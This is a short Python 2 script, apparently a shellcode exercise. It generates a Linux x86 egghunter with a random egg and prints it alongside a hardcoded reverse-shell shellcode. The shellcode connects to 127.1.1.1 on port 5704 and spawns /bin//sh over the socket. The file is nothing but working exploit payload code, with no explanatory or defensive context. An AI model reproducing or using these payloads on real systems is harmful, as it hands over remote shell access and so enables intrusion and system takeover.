import random

shellcode_payload = r"\x31\xc0\x31\xdb\x31\xd2\x52\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc6\x52\x68\x7f\x01\x01\x01\x66\x68\x16\x48\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x89\xf3\xb0\x3f\x49\xcd\x80\x75\xf9\x52\x89\xe2\x89\xe1\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";

eggBytes = [0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x90]
chosenEgg = []

for i in range(4):
    b = random.choice(eggBytes)
    chosenEgg.append(hex(b)[2:])
    
eggStr = "" #Real Value of Egg
eggStr2 = "" #Value of Egg with LSB decremented by 1

for b in chosenEgg:
    eggStr += "\\x" + b 

for i in range(len(chosenEgg)):
    eggStr2 += "\\x" + chosenEgg[i] if i > 0 else "\\x" + hex(int(chosenEgg[i], 16) - 1)[2:]

egghunter = (r"\x31\xc9\xf7\xe1\xbb" + eggStr2 + r"\x43\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\xff\xe2")
shellcode_payload = eggStr + shellcode_payload

print 'unsigned char egghunter[] = "%s";\n' % egghunter
print 'unsigned char shellcode[] = "%s";\n' % shellcode_payload
